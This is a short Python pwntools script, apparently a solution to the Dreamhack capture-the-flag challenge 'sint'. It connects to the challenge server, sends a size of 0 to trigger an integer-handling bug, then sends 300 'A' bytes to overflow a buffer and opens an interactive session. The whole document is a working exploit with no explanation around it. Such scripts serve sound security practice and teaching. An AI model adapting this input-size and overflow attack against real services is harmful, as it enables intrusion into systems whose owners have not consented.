from pwn import *

p = remote("host3.dreamhack.games", 12813)
e = ELF("./sint")

p.sendlineafter(b"Size: ", b"0")
p.sendlineafter(b"Data: ", b"A" * 300)

p.interactive()
